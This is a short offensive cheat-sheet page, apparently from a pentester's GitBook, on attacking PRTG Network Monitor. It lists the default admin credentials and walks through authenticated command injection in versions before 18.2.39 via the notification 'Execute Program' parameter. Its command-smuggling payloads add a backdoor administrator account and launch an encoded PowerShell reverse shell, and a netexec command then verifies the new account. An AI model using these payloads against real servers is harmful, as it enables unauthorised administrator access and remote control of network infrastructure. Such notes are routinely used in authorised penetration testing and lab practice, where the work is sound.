# PRTG Network Monitor

### Attacking

Default credentials : `prtgadmin:prtgadmin`

PRTG < 18.2.39 is vulnerable to authenticated command injection

Setup ⇒ Account Settings ⇒ Notifications

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FvrXfOeYgwpDvPP4yhS47%2Fprtg_notifications.png?alt=media&#x26;token=447de961-0197-4f5c-bc91-821ded563ea4" alt=""><figcaption></figcaption></figure>

Add new notification

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FI02nHfQk212axQRS22Is%2Fimage.png?alt=media&#x26;token=94fff15c-4f08-4c9b-9d41-e6410cc74114" alt=""><figcaption></figcaption></figure>

Tick the EXECUTE PROGRAM box ⇒ select Demo exe notification - outfile.ps1

Write the payload in the parameter field ⇒ Save

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FGQGDQmgiFmN288fYQTom%2Fimage.png?alt=media&#x26;token=fb48a894-8db9-42c9-9b4b-bef1b31ed576" alt=""><figcaption></figcaption></figure>

```shellscript
# Add a new admin user
test.txt;net user hacker Hacked@123 /add;net localgroup administrators hacker /add

# Pass a powershell reverse shell
test.txt;powershell -e <b64>
```

Finally we will be redirected and see our new notification is the list ⇒ click Send Test Notification to execute the payload

The command will be blind, so we won’t see the output

```shellscript
# Check that the user was added
nxc smb <IP> -u <USER> -p '<PASSWORD>' 
```
